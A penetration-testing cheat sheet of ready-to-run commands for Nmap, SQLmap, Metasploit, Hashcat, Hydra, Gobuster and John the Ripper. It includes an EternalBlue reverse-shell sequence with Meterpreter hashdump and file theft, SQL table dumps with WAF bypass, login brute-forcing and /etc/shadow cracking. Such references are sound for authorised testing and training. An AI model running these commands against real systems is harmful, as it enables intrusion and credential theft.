# Security Tools Reference

---

## Nmap — Network Scanner

```bash
# Basic scan
nmap target.com

# Service version detection
nmap -sV target.com

# OS detection + scripts + traceroute
nmap -A target.com

# All ports
nmap -p- target.com

# Fast scan (top 100 ports)
nmap -F target.com

# Scan a range
nmap 192.168.1.1-254

# Output to file
nmap -oN output.txt target.com
nmap -oX output.xml target.com

# Common scripts
nmap --script http-title target.com
nmap --script ssl-cert target.com
nmap --script smb-vuln* target.com
```

---

## Burp Suite — Web Proxy

**Setup:**
1. Set browser proxy → `127.0.0.1:8080`
2. Install Burp CA cert for HTTPS interception
3. Browse target — requests appear in Proxy → HTTP History

**Key features:**
- **Intercept** — pause and modify requests
- **Repeater** — manually resend/modify requests
- **Intruder** — automated fuzzing/brute force
- **Scanner** (Pro) — automated vulnerability scanner
- **Decoder** — encode/decode base64, URL, HTML

**Useful shortcuts:**
- `Ctrl+R` — send to Repeater
- `Ctrl+I` — send to Intruder
- `Ctrl+Shift+R` — send to Repeater and switch

---

## SQLmap — SQL Injection

```bash
# Basic scan
sqlmap -u "https://target.com/page?id=1"

# List databases
sqlmap -u "https://target.com/page?id=1" --dbs

# List tables in database
sqlmap -u "https://target.com/page?id=1" -D dbname --tables

# Dump table
sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump

# POST request
sqlmap -u "https://target.com/login" --data="user=admin&pass=test"

# Cookie-based injection
sqlmap -u "https://target.com/page" --cookie="session=abc123"

# Use a saved request from Burp
sqlmap -r request.txt

# Bypass WAF
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between
```

---

## Metasploit — Exploitation Framework

```bash
# Start
msfconsole

# Search for exploits
search eternalblue
search type:exploit platform:windows smb

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set target
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50  # your IP for reverse shell

# Set payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run
run  # or exploit

# Meterpreter commands (after shell)
sysinfo
getuid
getsystem       # privilege escalation
hashdump        # dump password hashes
screenshot
upload file.exe C:\\Windows\\Temp\\
download C:\\secret.txt /tmp/
shell           # drop to cmd shell
background      # background session
sessions -l     # list sessions
sessions -i 1   # resume session 1
```

---

## Hashcat — Password Cracking

```bash
# MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# SHA1
hashcat -m 100 hash.txt wordlist.txt

# bcrypt
hashcat -m 3200 hash.txt wordlist.txt

# NTLM (Windows)
hashcat -m 1000 hash.txt wordlist.txt

# With rules
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force mask (8 chars, lowercase)
hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l

# Show cracked
hashcat -m 0 hash.txt --show
```

---

## Gobuster — Directory/DNS Brute Force

```bash
# Directory enumeration
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# With file extensions
gobuster dir -u https://target.com -w wordlist.txt -x php,html,txt,bak

# DNS subdomain enumeration
gobuster dns -d target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# With auth
gobuster dir -u https://target.com -w wordlist.txt -U admin -P password
```

---

## Hydra — Login Brute Force

```bash
# HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# SSH
hydra -l root -P wordlist.txt ssh://target.com

# FTP
hydra -l admin -P wordlist.txt ftp://target.com

# RDP
hydra -l administrator -P wordlist.txt rdp://target.com

# Multiple usernames
hydra -L users.txt -P wordlist.txt ssh://target.com
```

---

## Wireshark — Packet Analysis

**Useful filters:**
```
http                          # HTTP traffic only
http.request.method == "POST" # POST requests
tcp.port == 443               # HTTPS traffic
ip.addr == 192.168.1.100      # specific host
dns                           # DNS queries
ftp                           # FTP traffic
frame contains "password"     # packets containing "password"
```

---

## John the Ripper — Password Cracking

```bash
# Basic crack
john hash.txt

# With wordlist
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked
john hash.txt --show

# Identify hash format
john --list=formats | grep -i md5
john hash.txt --format=Raw-MD5

# Linux shadow file
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=rockyou.txt
```
